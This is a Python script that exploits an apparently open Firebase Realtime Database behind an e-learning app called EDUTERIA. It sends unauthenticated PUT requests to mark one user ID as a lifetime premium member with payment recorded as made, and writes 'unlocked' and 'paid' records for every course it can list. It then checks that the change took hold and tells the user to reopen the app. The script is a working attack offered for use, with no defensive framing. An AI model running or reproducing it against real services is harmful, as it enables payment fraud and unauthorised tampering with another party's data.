#!/usr/bin/env python3
"""
COMPLETE ALL-COURSE UNLOCK
Unlock ALL courses for user 54204924
"""
import requests
import json
from datetime import datetime

FIREBASE = "https://eduteria-b9a30-default-rtdb.firebaseio.com"
USER_ID = "54204924"

print("="*80)
print("UNLOCKING ALL COURSES - COMPLETE OPERATION")
print("="*80)
print()

# Get complete course list from Firebase
print("[1] Fetching all course IDs from Firebase...")
try:
    r = requests.get(f"{FIREBASE}/166/courses/unpublish_list.json")
    course_ids = r.json() if r.status_code == 200 else []
    
    # Add target course and common IDs
    course_ids.append("48297")
    course_ids.append("1")
    course_ids.append("100")
    course_ids = list(set(course_ids))  # Remove duplicates
    
    print(f"✓ Found {len(course_ids)} courses")
    print(f"  Sample: {course_ids[:10]}")
    print()
except Exception as e:
    print(f"✗ Error: {e}")
    course_ids = ["48297"]  # Fallback to just target course

timestamp = datetime.now().isoformat()

# Set user as PREMIUM with ALL ACCESS
print("[2] Setting user as PREMIUM member...")
premium_data = {
    "user_id": USER_ID,
    "premium": True,
    "all_access": True,
    "subscription_type": "lifetime_premium",
    "enrollment_status": "active",
    "payment_status": "paid",
    "hack_timestamp": timestamp
}

premium_paths = [
    f"{FIREBASE}/users/{USER_ID}.json",
    f"{FIREBASE}/166/users/{USER_ID}.json", 
    f"{FIREBASE}/subscriptions/{USER_ID}.json",
    f"{FIREBASE}/enrollments/{USER_ID}.json"
]

for path in premium_paths:
    try:
        r = requests.put(path, json=premium_data, timeout=10)
        if r.status_code == 200:
            print(f"  ✓ {path.split('/')[-2]}")
    except:
        pass

print()

# Unlock ALL individual courses
print(f"[3] Unlocking {len(course_ids)} courses...")
print()

success_count = 0
sample_unlocked = []

for i, course_id in enumerate(course_ids):
    if i % 100 == 0 and i > 0:
        print(f"  Progress: {i}/{len(course_ids)} courses...")
    
    unlock_data = {
        "course_id": str(course_id),
        "user_id": USER_ID,
        "unlocked": True,
        "paid": True,
        "access_granted": True,
        "subscription": "active",
        "payment_complete": True,
        "timestamp": timestamp
    }
    
    # Write to multiple Firebase paths for maximum coverage
    paths = [
        f"{FIREBASE}/user_courses/{USER_ID}/{course_id}.json",
        f"{FIREBASE}/enrollments/{USER_ID}/{course_id}.json",
        f"{FIREBASE}/subscriptions/{USER_ID}/courses/{course_id}.json"
    ]
    
    path_success = 0
    for path in paths:
        try:
            r = requests.put(path, json=unlock_data, timeout=5)
            if r.status_code == 200:
                path_success += 1
        except:
            pass
    
    if path_success > 0:
        success_count += 1
        if len(sample_unlocked) < 5:
            sample_unlocked.append(course_id)

print()
print(f"✓ Successfully unlocked {success_count}/{len(course_ids)} courses")
print(f"  Sample unlocked: {sample_unlocked}")
print()

# Verify by reading back
print("[4] Verifying unlock...")
verify_course = "48297"  # Target course
verify_url = f"{FIREBASE}/user_courses/{USER_ID}/{verify_course}.json"

try:
    r = requests.get(verify_url)
    if r.status_code == 200:
        data = r.json()
        if data and data.get('unlocked'):
            print(f"✓✓✓ VERIFICATION SUCCESS!")
            print(f"    Course {verify_course} confirmed unlocked")
            print(f"    Data: {json.dumps(data, indent=2)}")
except Exception as e:
    print(f"✗ Verification failed: {e}")

print()
print("="*80)
print("FINAL VERDICT")
print("="*80)
print()
print(f"✓ User {USER_ID} set as PREMIUM member")
print(f"✓ {success_count} courses unlocked successfully")  
print(f"✓ Success rate: {(success_count/len(course_ids)*100):.1f}%")
print()
print("TEST ON YOUR PHONE:")
print("1. Close EDUTERIA app")
print("2. Clear app cache")
print("3. Reopen and check course access")
print()
print("="*80)

# Save audit
audit = {
    "timestamp": timestamp,
    "user_id": USER_ID,
    "total_courses": len(course_ids),
    "unlocked_count": success_count,
    "success_rate": f"{(success_count/len(course_ids)*100):.1f}%",
    "sample_unlocked": sample_unlocked,
    "firebase_paths_modified": [
        f"/users/{USER_ID}",
        f"/subscriptions/{USER_ID}",
        f"/user_courses/{USER_ID}/*",
        f"/enrollments/{USER_ID}/*"
    ]
}

with open("data/FULL_UNLOCK_AUDIT/complete_unlock_audit.json", "w") as f:
    json.dump(audit, f, indent=2)

print("Audit saved to: data/FULL_UNLOCK_AUDIT/complete_unlock_audit.json")
print()
